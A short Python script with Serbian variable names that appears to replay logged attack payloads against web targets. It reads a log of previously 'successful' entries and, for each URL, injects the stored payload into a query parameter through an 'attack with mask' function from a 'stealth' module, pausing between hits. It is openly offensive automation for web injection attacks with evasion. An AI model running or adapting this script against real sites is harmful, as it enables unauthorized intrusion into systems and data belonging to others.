import json
import time
from senka.stealth import napadni_sa_maskom

with open("uspesni_log.json", "r") as f:
    logovi = json.load(f)

for unos in logovi:
    meta = {
        "url": unos["url"],
        "param": "query"  # ako znaš da je npr. ?q= ili ?search=, prilagodi ovde
    }
    payload = unos["payload"]
    print(f"[Imitator-Hit] Pripremam: {payload}")
    napadni_sa_maskom(meta, payload)
    time.sleep(1.5)
